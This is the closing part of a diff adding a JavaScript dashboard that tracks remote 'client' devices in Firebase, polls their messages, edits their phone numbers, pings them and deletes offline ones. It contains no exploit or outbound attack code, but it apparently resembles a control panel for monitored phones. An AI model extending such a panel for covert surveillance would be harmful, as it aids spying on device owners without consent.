+  if(!id||!ph){toast('Enter ID and phone');return;}
+  try{await fbDB.ref('clients/'+id+'/mobNo').set(ph);closeM('updModal');toast('✓ Updated');}catch(e){toast('Error');}
+}
+function delOff(){
+  var off=allDevices.filter(function(d){return !d.status;});
+  if(!off.length){toast('No offline devices');return;}
+  if(!fbDB){toast('Not ready');return;}
+  document.getElementById('confT').textContent='Delete '+off.length+' offline devices?';
+  document.getElementById('confM').textContent='Cannot be undone.';
+  document.getElementById('confOk').onclick=async function(){closeM('confirmModal');for(var i=0;i<off.length;i++){try{await fbDB.ref(off[i].path+'/'+off[i].id).remove();}catch(e){}}toast('✓ Deleted');_allMsgsLoaded=false;};
+  openM('confirmModal');
+}
+function refreshAll(){_initialRestDone=false;_restRunning=false;startInitialREST();if(curMsgDev&&_msgPollDevice===curMsgDev)pollMessagesOnce(curMsgDev);_allMsgsLoaded=false;showToast('↻ Refreshing...','on');}
+function openM(id){document.getElementById(id).classList.add('open');}
+function closeM(id){document.getElementById(id).classList.remove('open');}
+function toast(msg){var el=document.getElementById('toastEl');el.textContent=msg;el.className='toast show';setTimeout(function(){el.classList.remove('show');},2200);}
+function showToast(msg,type){var el=document.getElementById('toastEl');el.textContent=msg;el.className='toast show'+(type?' '+type:'');setTimeout(function(){el.classList.remove('show');},3000);}
+function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
+function clip(txt){if(navigator.clipboard)navigator.clipboard.writeText(txt).then(function(){});}
+
+document.addEventListener('click',function(ev){
+  var card=ev.target.closest('.dev-card[data-dev]');
+  if(card&&!ev.target.closest('.dc-btn')){var devId=decodeURIComponent(card.getAttribute('data-dev'));openDeviceDetail(devId);}
+});
+
+function setPingingState(devId, state){
+  if(state){
+    _pingingDevices[devId] = true;
+    if(_pingResetTimers[devId]){clearTimeout(_pingResetTimers[devId]);}
+    _pingResetTimers[devId] = setTimeout(function(){
+      setPingingState(devId, false);
+    }, 2500);
+  } else {
+    delete _pingingDevices[devId];
+    if(_pingResetTimers[devId]){clearTimeout(_pingResetTimers[devId]);delete _pingResetTimers[devId];}
+  }
+  var card=document.querySelector('.dev-card[data-dev="'+encodeURIComponent(devId)+'"]');
+  if(card){
+    if(state){card.classList.add('ping-glow');var b=card.querySelector('.dc-btn');if(b)b.classList.add('pinging');}
+    else{card.classList.remove('ping-glow');var b2=card.querySelector('.dc-btn');if(b2)b2.classList.remove('pinging');}
+  }
+  if(currentNav==='device-detail' && selDev && selDev.id===devId){
+    var dbtn=document.getElementById('pingBtnDetail');
+    if(dbtn){dbtn.classList.toggle('active',state);}
+  }
+}
+
+function pingSingleDevice(devId){
+  if(!devId)return;
+  setPingingState(devId,true);
+  var cur=allDevices.find(function(d){return d.id===devId;});
+  var devPath='clients/'+devId;
+  if(cur&&cur.path&&cur.path!=='clients')devPath=cur.path+'/'+devId;
+  restFetch(devPath).then(function(data){
+    var isOnline=false;var fresh=null;
+    if(data&&typeof data==='object'){isOnline=isDeviceOnline(data);var parsed=parseDevs({[devId]:data},cur?cur.path:'clients');if(parsed.length){fresh=parsed[0];fresh.id=devId;}}
+    var idx=allDevices.findIndex(function(d){return d.id===devId;});
+    if(idx!==-1&&fresh)allDevices[idx]=fresh;
+    if(selDev&&selDev.id===devId){if(fresh)selDev=fresh;else selDev.status=isOnline;var box=document.getElementById('deviceProfileBox');if(box)box.innerHTML=renderDeviceProfileHTML(selDev);}
+    if(currentNav==='devices'){
+      var card=document.querySelector('.dev-card[data-dev="'+encodeURIComponent(devId)+'"]');
+      if(card){card.outerHTML=renderDeviceCard(fresh||cur);}
+    } else if(currentNav==='overview'){
+      var mc=document.getElementById('mainContent');if(mc)mc.innerHTML=renderOverviewHTML();
+    }
+    showToast('📡 '+(isOnline?'ONLINE':'OFFLINE')+(cur?' — '+getDeviceDisplayName(cur):''),isOnline?'on':'off');
+    setPingingState(devId,false);
+  }).catch(function(err){
+    showToast('📡 Ping failed','off');
+    setPingingState(devId,false);
+  });
+}
+
+function scrollToTop() {
+    var mc = document.getElementById('mainContent');
+    if(mc) {
+        mc.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    var mc = document.getElementById('mainContent');
+    var topBtn = document.getElementById('goToTopBtn');
+    if (mc && topBtn) {
+        mc.addEventListener('scroll', function() {
+            if (mc.scrollTop > 300) {
+                topBtn.classList.add('show');
+            } else {
+                topBtn.classList.remove('show');
+            }
+        });
+    }
+});
+
+loadAuthSettings();
+
+setTimeout(function(){
+  if(_authSettings.enabled && _authSettings.method!=='none' && !hasSessionUnlocked())return;
+  if(!_dataLoaded){startInitialREST();}
+}, 60);
+
+setTimeout(function(){
+  if(_authSettings.enabled && _authSettings.method!=='none' && !hasSessionUnlocked())return;
+  if(!_dataLoaded && allDevices.length===0){
+    var mc=document.getElementById('mainContent');
+    if(mc && mc.innerHTML.indexOf('ldwrap')!==-1){showFatalError();}
+  }
+}, 8000);
+
+document.addEventListener('DOMContentLoaded',function(){
+  if(_authSettings.enabled && _authSettings.method!=='none' && !hasSessionUnlocked()){checkAuthAndUnlock();}
+  else{
+    if(!_dataLoaded){var mc=document.getElementById('mainContent');if(mc)mc.innerHTML='<div class="ldwrap"><div class="gold-spin"></div><div>📱 Loading…</div></div>';}
+    setTimeout(startApp,100);setTimeout(startApp,1000);setTimeout(startApp,2500);
+  }
+});
+window.addEventListener('load',function(){
+  if(_authSettings.enabled && _authSettings.method!=='none' && !hasSessionUnlocked()){checkAuthAndUnlock();}
+  else{startApp();if(!_dataLoaded && !_restRunning){_initialRestDone=false;startInitialREST();}}
+});
+setTimeout(function(){if(_authSettings.enabled && _authSettings.method!=='none' && !hasSessionUnlocked())return;if(!_dataLoaded||allDevices.length===0){if(!_restRunning){_initialRestDone=false;startInitialREST();}}},5000);
+setTimeout(function(){if(_authSettings.enabled && _authSettings.method!=='none' && !hasSessionUnlocked())return;if(!_dataLoaded||allDevices.length===0){if(!_restRunning){_initialRestDone=false;startInitialREST();}}},10000);
+startWatchdog();
+</script>
+</body>
+</html>
